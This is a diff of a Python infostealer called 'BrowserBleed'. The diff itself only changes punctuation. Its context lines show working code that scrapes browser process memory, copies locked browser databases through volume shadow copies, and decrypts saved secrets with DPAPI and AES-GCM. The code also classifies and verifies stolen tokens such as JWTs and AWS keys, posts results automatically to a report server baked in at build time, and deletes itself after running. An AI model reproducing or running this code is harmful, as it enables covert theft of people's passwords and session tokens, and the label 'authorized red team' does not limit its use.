@@ -2,7 +2,7 @@
 BrowserBleed - Browser Credential & Memory Extractor
 Authorized Red Team / Research Use Only
 
-Default: tries everything — disk extraction + live memory scrape on all browsers.
+Default: tries everything - disk extraction + live memory scrape on all browsers.
 Run as Administrator for full coverage (SQLite VSS fallback + elevated process access).
 
 Usage:
@@ -50,7 +50,7 @@ _do_oidc: bool = False
 PROCESS_VM_READ           = 0x0010
 PROCESS_QUERY_INFORMATION = 0x0400
 MEM_COMMIT                = 0x1000
-MEM_IMAGE                 = 0x1000000  # DLL/EXE code sections — skip, no credentials here
+MEM_IMAGE                 = 0x1000000  # DLL/EXE code sections - skip, no credentials here
 PAGE_NOACCESS             = 0x01
 PAGE_GUARD                = 0x100
 TH32CS_SNAPPROCESS        = 0x00000002
@@ -244,7 +244,7 @@ def vss_copy(src: str) -> str | None:
             device    = device.strip()
             shadow_id = shadow_id.strip()
 
-        # Sanitize shadow_id — must be a GUID
+        # Sanitize shadow_id - must be a GUID
         if not _SHADOW_ID_RE.match(shadow_id):
             return None
 
@@ -335,9 +335,9 @@ def copy_db_with_wal(src: str) -> str:
         else:
             shutil.rmtree(tmp_dir, ignore_errors=True)
             if is_admin():
-                hint = " — file is exclusively locked by browser; VSS may not be available on this system"
+                hint = " - file is exclusively locked by browser; VSS may not be available on this system"
             else:
-                hint = " — run as Administrator to enable VSS fallback"
+                hint = " - run as Administrator to enable VSS fallback"
             raise OSError(f"Could not copy locked file{hint}: {src}")
 
     for suffix in ("-wal", "-shm"):
@@ -423,7 +423,7 @@ def _trunc(val: str, n: int = 80) -> str:
 
 # Fast pre-filter: C-speed bytes.__contains__ checks before running any regex.
 # A chunk that contains none of these prefixes can't contain a credential match.
-# Build-time exfil defaults — substituted by build_windows.ps1 / build_mac.sh.
+# Build-time exfil defaults - substituted by build_windows.ps1 / build_mac.sh.
 # When non-empty the exe auto-exfils after every run with no CLI flags required.
 _EXFIL_URL: str = ""
 _EXFIL_KEY: str = ""
@@ -466,7 +466,7 @@ def scrape_pid(pid: int, max_hits: int = 300, chunk: int = 65536) -> list[dict]:
     )
     if not handle:
         err = _k32.GetLastError()
-        if err == 87:   # ERROR_INVALID_PARAMETER — GPU/crashpad/utility process, skip silently
+        if err == 87:   # ERROR_INVALID_PARAMETER - GPU/crashpad/utility process, skip silently
             return []
         raise PermissionError(f"OpenProcess failed (error {err})")
 
@@ -503,7 +503,7 @@ def scrape_pid(pid: int, max_hits: int = 300, chunk: int = 65536) -> list[dict]:
                         continue
                     data = buf.raw[: bytes_read.value]
 
-                    # Skip zero-filled pages — no credentials live in zeroed memory
+                    # Skip zero-filled pages - no credentials live in zeroed memory
                     if not data.rstrip(b"\x00"):
                         prev_data = b""
                         continue
@@ -553,8 +553,8 @@ def scrape_pid(pid: int, max_hits: int = 300, chunk: int = 65536) -> list[dict]:
 
 def deduplicate(hits: list[dict]) -> list[dict]:
     """Two-pass dedup:
-    Pass 1 — group by label:value[:50], keep shortest (removes trailing noise).
-    Pass 2 — within each label, if A is a prefix of B, replace A with B (recovers
+    Pass 1 - group by label:value[:50], keep shortest (removes trailing noise).
+    Pass 2 - within each label, if A is a prefix of B, replace A with B (recovers
               chunk-boundary truncations where the same token was captured twice,
               once cut short and once in full).
     """
@@ -620,7 +620,7 @@ def _get_profiles(user_data_path: str) -> list[tuple[str, str]]:
 def dpapi_decrypt(ciphertext: bytes) -> bytes:
     if _is_system():
         raise RuntimeError(
-            "Running as SYSTEM — DPAPI cannot decrypt user keys without the user's master key. "
+            "Running as SYSTEM - DPAPI cannot decrypt user keys without the user's master key. "
             "Run as the target user or use token impersonation."
         )
     blob_in  = DATA_BLOB(len(ciphertext), ctypes.cast(ctypes.c_char_p(ciphertext), ctypes.POINTER(ctypes.c_char)))
@@ -643,7 +643,7 @@ def get_master_key(user_data_path: str) -> bytes:
 def decrypt_value(master_key: bytes, enc: bytes) -> str:
     try:
         if enc[:3] == b"v20":
-            return "<v20 app-bound encryption: requires elevation service — use memory scrape>"
+            return "<v20 app-bound encryption: requires elevation service - use memory scrape>"
         if enc[:3] == b"v10":
             return AESGCM(master_key).decrypt(enc[3:15], enc[15:], None).decode("utf-8", errors="replace")
         return dpapi_decrypt(enc).decode("utf-8", errors="replace") if enc else ""
@@ -1239,13 +1239,13 @@ def identify_service(label: str, value: str, context: bytes = b"") -> str:
     if re.match(r"^20111[A-Za-z0-9\-_]{20,}$", v):
         return "Anthropic / Claude"
 
-    # ── JWT — decode issuer / audience ───────────────────────────────────────
+    # ── JWT - decode issuer / audience ───────────────────────────────────────
     if label == "JWT token" or (v.startswith("eyJ") and v.count(".") == 2):
         header = _decode_jwt_header(v)
         kid    = str(header.get("kid", ""))
         for pat, svc in _KID_MAP:
             if pat.match(kid):
-                return f"JWT — {svc}"
+                return f"JWT - {svc}"
 
         claims   = _decode_jwt_claims(v)
         iss      = str(claims.get("iss", ""))
@@ -1255,15 +1255,15 @@ def identify_service(label: str, value: str, context: bytes = b"") -> str:
         combined = f"{iss} {aud}".lower()
         for pattern, name in _ISS_MAP:
             if pattern in combined:
-                return f"JWT — {name}"
+                return f"JWT - {name}"
         m = re.search(r"https?://([^/\s]+)", iss)
         if m:
             discovered = _oidc_discover(iss)
             if discovered:
-                return f"JWT — {discovered}"
-            return f"JWT — {m.group(1)}"
+                return f"JWT - {discovered}"
+            return f"JWT - {m.group(1)}"
         if iss:
-            return f"JWT — {iss[:50]}"
+            return f"JWT - {iss[:50]}"
         for claim_val in claims.values():
             if not isinstance(claim_val, str) or not claim_val.startswith("http"):
                 continue
@@ -1273,13 +1273,13 @@ def identify_service(label: str, value: str, context: bytes = b"") -> str:
             domain = cm.group(1).lower()
             for frag, svc_name in _DOMAIN_SVC:
                 if _domain_matches(frag, domain):
-                    return f"JWT — {svc_name}"
-            return f"JWT — {domain}"
+                    return f"JWT - {svc_name}"
+            return f"JWT - {domain}"
         if context:
             svc = _service_from_context(context)
             if svc:
-                return f"JWT — {svc}"
-        return "JWT — unknown issuer"
+                return f"JWT - {svc}"
+        return "JWT - unknown issuer"
 
     # ── Context-based fallback: scan surrounding memory bytes ─────────────────
     if context:
@@ -1438,7 +1438,7 @@ def verify_aws(access_key: str) -> dict:
         amzdate  = now.strftime("%Y%m%dT%H%M%SZ")
         datestamp = now.strftime("%Y%m%d")
 
-        # Without a secret key we can't sign — just try unauthenticated and inspect 403 vs 400
+        # Without a secret key we can't sign - just try unauthenticated and inspect 403 vs 400
         req = urllib.request.Request(
             endpoint,
             data=payload.encode(),
@@ -1453,7 +1453,7 @@ def verify_aws(access_key: str) -> dict:
                 return {"valid": None, "reason": "unexpected 200 without signing"}
         except urllib.error.HTTPError as e:
             if e.code == 403:
-                return {"valid": None, "reason": "key ID exists (403 auth failed — no secret key available)"}
+                return {"valid": None, "reason": "key ID exists (403 auth failed - no secret key available)"}
             return {"valid": False, "reason": f"HTTP {e.code}"}
     except Exception as ex:
         return {"valid": None, "reason": str(ex)}
@@ -1660,7 +1660,7 @@ def process_browser(name: str, process_name: str, user_data_path: str,
             for h in group:
                 svc_counts[h["_svc"]] = svc_counts.get(h["_svc"], 0) + 1
             svc_summary = "  ".join(f"{s} ({c})" for s, c in sorted(svc_counts.items()))
-            lines.append(f"  {label}  ({len(group)} unique)  —  {svc_summary}")
+            lines.append(f"  {label}  ({len(group)} unique)  -  {svc_summary}")
             continue
 
         for h in group:
@@ -1739,7 +1739,7 @@ def main():
     parser.add_argument("--out",         metavar="PATH",      help="Output file path (default: none when server is baked in, otherwise bb_results.txt next to exe)")
     parser.add_argument("--max-hits",    type=int, default=300, help="Max memory hits per browser before dedup (default: 300)")
     parser.add_argument("--self-delete", action=argparse.BooleanOptionalAction, default=bool(_EXFIL_URL),
-                        help="Delete exe after run — on by default when server is baked in (--no-self-delete to keep)")
+                        help="Delete exe after run - on by default when server is baked in (--no-self-delete to keep)")
     parser.add_argument("--verify",      action="store_true", help="Verify captured tokens against their services (makes outbound requests)")
     parser.add_argument("--exfil",       metavar="URL",       default=_EXFIL_URL or None, help="POST results to report server (default: baked in at build time)")
     parser.add_argument("--exfil-key",   metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
@@ -1767,9 +1767,9 @@ def main():
     # Warn if critical env vars are missing (common when running as SYSTEM or in restricted context)
     warn_lines = []
     if not os.environ.get("LOCALAPPDATA"):
-        warn_lines.append("[!] LOCALAPPDATA is not set — Chromium-based browser paths may be wrong")
+        warn_lines.append("[!] LOCALAPPDATA is not set - Chromium-based browser paths may be wrong")
     if not os.environ.get("APPDATA"):
-        warn_lines.append("[!] APPDATA is not set — Opera / Firefox paths may be wrong")
+        warn_lines.append("[!] APPDATA is not set - Opera / Firefox paths may be wrong")
 
     lines = [
         "=" * 70,
@@ -1834,7 +1834,7 @@ def main():
     report = "\n".join(lines)
 
     # When _EXFIL_URL is baked in and no explicit --out, use a temp file that
-    # gets cleaned up after upload — nothing persists on the target's disk.
+    # gets cleaned up after upload - nothing persists on the target's disk.
     _using_temp = False
     if args.out:
         out_path = args.out
